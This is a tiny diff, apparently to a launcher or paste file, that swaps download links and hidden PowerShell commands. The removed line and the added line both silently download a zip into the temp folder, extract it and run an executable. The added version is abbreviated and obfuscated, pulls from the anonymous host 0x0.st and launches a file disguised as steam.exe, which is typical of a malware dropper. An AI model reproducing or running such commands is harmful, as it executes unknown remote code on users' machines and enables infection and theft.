@@ -1,2 +1,2 @@
-https://mega.nz/file/WFwn0bJS#qhv7CSYGPaU2EQH56zQGKL1oGKOK2iJx_illmEYGKYU
-powershell -NoProfile -WindowStyle Hidden -Command "$u='https://exemplu.com/fișier.zip'; $z=\"$env:TEMP\fișier.zip\"; $d=\"$env:TEMP\extrase\"; Invoke-WebRequest -Uri $u -OutFile $z; Expand-Archive -Path $z -DestinationPath $d -Force; Start-Process \"$d\program.exe\""
+powershell -w h -noni -nop -c "$u='https://0x0.st/8fVK.zip';$z=$env:TEMP+'\8fVK.zip';$e=$env:TEMP+'\e';iwr $u -o $z;Expand-Archive $z $e -f;$s=(gci $e -r -fi steam.exe|select -f 1).FullName;if($s){Start $s}"
+https://mega.nz/file/LUwk3SDZ#zXPWpxRfpRlsQpDE4z8HYts4PRgTRF-aixMZqe2-Aqc
